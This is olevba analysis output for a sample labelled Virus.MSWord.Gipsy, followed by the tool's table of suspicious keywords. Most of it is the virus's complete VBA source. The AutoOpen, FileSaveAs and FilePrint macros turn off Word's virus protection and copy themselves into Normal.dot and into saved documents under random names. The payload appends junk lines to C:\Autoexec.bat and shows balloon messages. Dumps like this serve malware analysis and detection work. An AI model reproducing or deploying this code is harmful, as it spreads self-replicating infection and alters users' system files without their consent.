olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Gipsy-8d052e1a8ac3511df3559f9343958c30a0ba13b5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Gipsy-8d052e1a8ac3511df3559f9343958c30a0ba13b5 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO GIPSY.bas 
in file: Virus.MSWord.Gipsy-8d052e1a8ac3511df3559f9343958c30a0ba13b5 - OLE stream: 'Macros/VBA/GIPSY'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
For i = 1 To NormalTemplate.VBProject.VBComponents.Count
    NormalTemplate.VBProject.VBComponents(i).Export "C:\Gen.dat"
    Open "C:\Gen.dat" For Input As #1
    Do
    Line Input #1, NormInstalled
    Loop Until Left(NormInstalled, 3) = "Sub" Or Left(NormInstalled, 7) = "VERSION"
    Line Input #1, NormInstalled
    Line Input #1, DocInstalled
    Line Input #1, DocThere
    If NormInstalled = "Application.EnableCancelKey = wdCancelDisabled" And DocInstalled = "WordBasic.DisableAutoMacros 0" And DocThere = "Options.VirusProtection = False" Then
        Close #1
        Kill "C:\Gen.dat"
        Call Payload
    GoTo ErrorAO
    End If
    Close #1
Next i

For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    ActiveDocument.VBProject.VBComponents(x).Export "C:\Gen.dat"
    Open "C:\Gen.dat" For Input As #1
    Do
    Line Input #1, NormInstalled
    Loop Until Left(NormInstalled, 3) = "Sub" Or Left(NormInstalled, 7) = "VERSION"
    Line Input #1, NormInstalled
    Line Input #1, DocInstalled
    Line Input #1, DocThere
    If NormInstalled = "Application.EnableCancelKey = wdCancelDisabled" And DocInstalled = "WordBasic.DisableAutoMacros 0" And DocThere = "Options.VirusProtection = False" Then
        Close #1
        Kill "C:\Gen.dat"
        GoTo InfectionStart
    End If
    Close #1
Next x
InfectionStart:
Randomize (Int(Timer * Timer / Int(Rnd * Timer)))
NormInstalled = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65)
DocInstalled = ActiveDocument.VBProject.VBComponents(x).Name
Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:=DocInstalled, Object:=wdOrganizerObjectProjectItems
Application.OrganizerRename Source:=NormalTemplate.FullName, Name:=DocInstalled, NewName:=NormInstalled, Object:=wdOrganizerObjectProjectItems
ErrorAO:
End Sub
Sub Payload()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize Timer
i = Int(Rnd * 10)
Select Case i
Case Is <= 3
With Assistant.NewBalloon
    .Heading = "The Gipsy Virus:"
    .Text = "Copy me, I like to travel"
    .Show
End With
Case Is >= 4
Open "C:\Autoexec.bat" For Append As #1
Print #1, "@echo off"
For x = 1 To 20
Print #1, "echo Help me I'm sick >>C:\Computer." & "V" & Chr(255) & Chr(219)
Next x
Close #1
End Select
If Left(Date, 5) = "24.12" Then
With Assistant.NewBalloon
    .Heading = "BiologicBeast Virus:"
    .Text = "Mary Christmas...     don't work at this day"
    .Show
End With
ThisDocument.Save
ThisDocument.Close
End If
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
    Dialogs(wdDialogFileSaveAs).Show
    If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then
        ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
    End If
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    NormalTemplate.VBProject.VBComponents(x).Export "C:\Gen.dat"
    Open "C:\Gen.dat" For Input As #1
    Line Input #1, WhoAmI
    Line Input #1, WhoAmI
    Line Input #1, NormInstalled
    Line Input #1, NormReadOnly
    Line Input #1, DocInstalled
    Line Input #1, DocThere
    If NormInstalled = "Sub AutoOpen()" And NormReadOnly = "Application.EnableCancelKey = wdCancelDisabled" And DocInstalled = "WordBasic.DisableAutoMacros 0" And DocThere = "Options.VirusProtection = False" Then
    Close #1
    Kill "C:\Gen.dat"
    GoTo InfectionStart
    End If
Close #1
Next x
InfectionStart:
Randomize (Int(Timer * Timer / Int(Rnd * Timer)))
DocInstalled = Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65) & Chr(Int(Rnd * 25) + 65)
NormInstalled = NormalTemplate.VBProject.VBComponents(x).Name
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:=NormInstalled, Object:=wdOrganizerObjectProjectItems
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=NormInstalled, NewName:=DocInstalled, Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub
Sub FilePrint()
On Error Resume Next
Selection.MoveEnd
Selection.Text = Chr(13) & "...help me, I'm sick"
Dialogs(wdDialogFilePrint).Show
Selection.Delete
End Sub
Sub ViewVBCode()
Call Payload
End Sub
Sub ToolsMacro()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Autoexec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Autoexec.bat        |Executable file name                         |
+----------+--------------------+---------------------------------------------+
